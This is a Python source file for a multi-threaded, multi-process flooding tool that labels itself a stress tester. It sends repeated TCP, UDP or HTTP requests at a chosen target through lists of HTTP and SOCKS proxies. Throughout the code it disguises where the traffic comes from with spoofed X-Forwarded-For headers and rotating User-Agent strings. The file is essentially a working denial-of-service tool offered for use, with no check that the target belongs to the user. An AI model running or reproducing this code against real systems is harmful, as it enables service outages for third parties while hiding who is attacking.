...
__version__ = 'v1.0.1'
__author__ = 'vforbox <vforbox@gmail.com>'

sub_parser = argparse.ArgumentParser(add_help=False)
sub_parser.add_argument('-target', help='Target URL/Ip')
sub_parser.add_argument('-type', 
	default='HTTP', help='Proxy Type HTTP/SOCKS')
sub_parser.add_argument('-proxy', 
	default='proxy.txt', help='HTTP/Socks Poxy File')
sub_parser.add_argument('-thread', 
	type=int, default=1000, help='Threads')
sub_parser.add_argument('-multiple', 
	type=int, default=5, help='Send data multiple')

parser = argparse.ArgumentParser(description='Stress test tool')
subparsers = parser.add_subparsers(title='sub commands', 
	dest='command')
tcp = subparsers.add_parser('TCP', parents=[sub_parser])
tcp.add_argument('-port', type=int, default=80, 
	help='Target Port')
tcp.add_argument('-payload', default='payload.txt', 
	help='Customize Payload File')
udp = subparsers.add_parser('UDP', parents=[sub_parser])
udp.add_argument('-payload', default='payload.txt', 
	help='Customize Payload File')
http = subparsers.add_parser('HTTP', parents=[sub_parser])
http.add_argument('-method', default='GET', 
	help='HTTP request method, GET, POST, PUT ...')
http.add_argument('-data', default=None, help='HTTP request content, POST only')
...
EX = threading.Event()
PROXY_LIST = [] # HTTP/Socks Proxy file list
PLAYLOAD_LIST = [] # TCP/UDP payload data file list

if args.command:
	if os.path.exists(args.proxy):
		with io.open(args.proxy) as fp:
			PROXY_LIST = fp.readlines()

if args.command == 'TCP' or args.command == 'UDP':
	if os.path.exists(args.payload):
		with io.open(args.payload) as fp:
			PLAYLOAD_LIST = fp.readlines()
...
USER_AGENT_LIST = [
	...
	"Mozilla/5.0 (Maemo; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
	...
	"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
...
class CustomizePayload(object):
    """Customize Payload.
	
	Customize Payload by file or by defining code
	
	Attributes:
		host: target Ip address (192.168.1.1)
		port: target port, range 1-65535
    """
    def __init__(self, host, port=1000):
        """Inits CustomizePayload with blah."""
        assert isinstance(host, str), \
	        'host must be string'

        self.host = host

        assert self._valid_ip(self.host), \
    ...
    def request_message(self):
        ...
        data = ''.join(PLAYLOAD_LIST)

        return data

    def _valid_ip(self, host):
        """ Verify IP address """
        try:
            ip = socket.gethostbyname(host)
        except socket.gaierror as e:
            raise CustomError('Analysis {0} error'
            	.format(host))
        try:
            socket.inet_aton(ip)
            return True
...
class HttpPlayload(object):
	...
	Attributes:
		url: https://www.google.com/ or Host (192.168.1.1)
		method: HTTP Request Method (GET, POST, HEAD, ...)
		data: Request Body (time=xxxx&token=xxx), POST only
		proxy_type: proxy type, Currently there is HTTP/Socks
    """
    def __init__(self, url, method, data=None, proxy_type='HTTP'):
        """ Inits HttpPlayload with blah. """
        assert isinstance(url, str), \
        	'http://domain.com[:8110]/read.php?key=1'
        ...
        if method == 'GET' or method == 'POST':
            ...
            raise CustomError('method must be GET/POST')

        if method == 'POST':
            assert isinstance(data, str), \
	            'data must be string, (time=xx&token=xxx)'
        ...
        if proxy_type == 'HTTP' or proxy_type == 'SOCKS':
            ...
            raise CustomError('proxy must be HTTP/SOCKS')

    @property
    def get_target_port(self):
        """ get target port number """
        try:
        	port = self._url_parse('netloc').split(':')[1]
    ...
    def get_target_ip(self):
    	""" get target ip address """
    	try:
	    	ip = socket.gethostbyname(self.get_target_host)
    	except socket.gaierror as e:
	    	raise CustomError('Analysis {0} error, stop ..'
	    		.format(self.get_target_host)
	    	)
    ...
    def get_target_host(self):
        """ get target host  """
        target_host = self._url_parse('netloc').split(':')[0]

        return target_host

    def _url_parse(self, key):
    	""" URL parse """
    	url_parse_data = {}

    	try:
	    	if 'http' not in self.url[:4]:
	    		path = self.url.split('//')[1]
	    		self.url = 'http://{0}'.format(path)
    	except IndexError as e:
    		self.url = 'http://{0}'.format(self.url)

    	parse_result = urlparse(self.url)
    	url_parse_data['scheme'] = parse_result.scheme
    	url_parse_data['netloc'] = parse_result.netloc
    	url_parse_data['url'] = parse_result.path if \
    		parse_result.path else '/'
    	url_parse_data['url'] = url_parse_data['url'] \
    		+ parse_result.query

    	return url_parse_data.get(key)
    ...
    def _request_header(self):
    	...
    	host = "Host: {0}\r\n".format(self._url_parse('netloc'))
    	forward = "X-Forwarded-For: {0}\r\n".format(self._random_ip())
    	ua = "User-Agent: {0}\r\n".format(random.choice(USER_AGENT_LIST))

    	if self.proxy_type == 'SOCKS':
    		return host + ua + accept + connection + "\r\n"
    	return host + ua + accept + forward + connection + "\r\n"
    ...
    def request_message(self):
        ...
        request = self._request_line() + self._request_header()
        
        if self.method == 'POST':
        	request = '{0}{1}'.format(request, self._request_body())

        return request

class RequestProxyForward(threading.Thread):
    """Request Proxy Forward.

		Use a proxy to forward a custom or 
		known protocol generated Playload to a target.

	Attributes:
		host: target url (https://www.baidu.com) or
			  target Ip (192.168.1.1).
		port: target port, range 1-65535.
		event: One of the simplest mechanisms for 
			   multithreaded communication.
		multiple: The number of times the payload is sent.
		counter: Thread loop count.
		protocol: Transport layer protocol, TCP/UDP/HTTP.
		payload: Custom request message or known request message.
		proxy_type: There are two types of agents, HTTP/SOCKS.
    """
    def __init__(self, host, port, event, multiple, counter, 
		protocol='TCP', payload='', proxy_type='HTTP'
	):
        """Inits RequestProxySocket with blah."""
        ...
        if payload:
            ...
            self.payload = random._urandom(1024)

        self.payload = payload

        assert isinstance(event, threading.Event), \
            'event must be threading.Event'
        ...
        if (protocol == 'TCP') or (protocol == 'UDP') or \
        	(protocol == 'HTTP'):
            self.protocol = protocol
        else:
            raise CustomError('protocol must be TCP/UDP/HTTP')

    def run(self):
        assert isinstance(PROXY_LIST, list), \
            'HTTP_PROXY_FP must be list'

        if self.counter < len(PROXY_LIST):
            proxy = PROXY_LIST[self.counter].strip().split(':')
        else:
            proxy = random.choice(PROXY_LIST).strip().split(':')

        self.counter + 1
        self.event.wait()

        # TODO: HTTP request uses Socket, to solve Socks bug
        # 499, client has closed connection
        if self.protocol == 'HTTP' and self.proxy_type == 'HTTP':
            while True:
                sock = None
                try:
                	# Use Proxy Type HTTP/HTTPS Reqeust
                    sock = self._socket_proxy_request(proxy[0], proxy[1])
                except: # BrokenPipeError: [Errno 32] Broken pipe
                	pass

        # TCP payload can be forwarded via HTTP proxy request
        elif self.proxy_type == 'HTTP':
            while True:
                sock = None
	        	# UDP only supported by SOCKS5 proxy type 
                ...
                try:
                	# Use Proxy Type HTTP/HTTPS Reqeust
                    sock = self._socks_proxy_request(proxy[0], proxy[1], 1)
                except: # BrokenPipeError: [Errno 32] Broken pipe
                    pass

        # TCP/UDP payload can be forwarded through Socks proxy request
        else:
            while True:
                sock = None
                try:
	        		# Use Proxy Type Socks5 Reqeust
                    sock = self._socks_proxy_request(proxy[0], proxy[1], 5)
                except: # BrokenPipeError: [Errno 32] Broken pipe
                    pass

            	# Request processing completed, skip current thread loop
                if sock:
                    continue
	            ...
	            # Use Proxy Type Socks4 Reqeust
                try:
                    sock = self._socks_proxy_request(proxy[0], proxy[1], 4)
                except: # BrokenPipeError: [Errno 32] Broken pipe
                    pass
	            
	            # Request failed, end current thread loop
                if not sock:
                    break

    def _socket_proxy_request(self, proxy_host, proxy_port):
        """ HTTP Proxy HTTP Playload Request """
        sock = True

        try:
	        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	        sock.connect((str(proxy_host), int(proxy_port)))
	        sock.send(str.encode(self.payload))
	        sock.recv(0) # Solve known bugs, http://t.cn/EfFVRnO
	        print('HTTP Proxy {0}:{1} Send Data Success, DataLen={2}'
	        	.format(proxy_host, proxy_port, len(self.payload)))
        except:
            sock.close()
            sock = False

        if sock and self.multiple > 0:
            try:
                ...
                print('HTTP Proxy {1}:{2} unavailable'.format(proxy_host,
                	proxy_port))
                sock.close()
            sock = True
    ...
    def _socks_proxy_request(self, proxy_host, proxy_port, proxy_type):
        """ Socks/HTTP Proxy ustomize Playload Request """
        sock = True
        ...
        try:
	        socks.set_default_proxy(socks_type, str(proxy_host),
	        	int(proxy_port), True)
	        sock = socks.socksocket(socket.AF_INET, socket_type)
	        sock.connect((str(self.host), int(self.port)))
	        sock.send(str.encode(self.payload))
	        sock.recv(0) # Solve known bugs, http://t.cn/EfFVRnO
	        print('proxy {0}:{1} Send Data Success, DataLen={2}'
	        	.format(proxy_host, proxy_port, len(self.payload)
	        ))
        except:
	        print('proxy {0}:{1} unavailable'
...
def loop(host, port, payload=''):
    """ Thread loop """
    for counter in range(args.thread):
    	# TODO: 499, client has closed connection
	    # args.command The parameter is modified to TCP.
	    # HTTP upper layer protocol is TCP
        if args.command == 'HTTP':
            t = HttpPlayload(args.target, args.method, args.data, args.type)
            RequestProxyForward(host, port, EX, args.multiple, counter, 
            	args.command, t.request_message, args.type).start()
        else:
            RequestProxyForward(host, port, EX, args.multiple, 
	        	counter, args.command, payload, args.type).start()
    print('Child Process {0} Start  ...'.format(os.getpid()))
    EX.set() # Setting signal

if __name__ == '__main__':
	"""
		PIL lock exists in python's multithreading, 
		so python's multithreading cannot use multicore.
		
		Python multi-process can run multiple CPUs, 
		so use multi-process + multi-threaded.
	"""
	cpu_count = multiprocessing.cpu_count()
	pool = Pool(processes=cpu_count) # Create a process pool
	multiprocessing.freeze_support() # WINDOWS platform to avoid RuntimeError

	if args.command == 'HTTP':
		p = HttpPlayload(args.target, args.method, args.data, args.type)
		for _ in range(cpu_count):
			pool.apply(loop, args=(p.get_target_ip, p.get_target_port))
		pool.close()
		pool.join()
	else:
		p = CustomizePayload(args.target, args.port)
		for _ in range(cpu_count):
			pool.apply(loop, args=(p.get_target_ip, p.get_target_port, 
				p.request_message))
		pool.close()
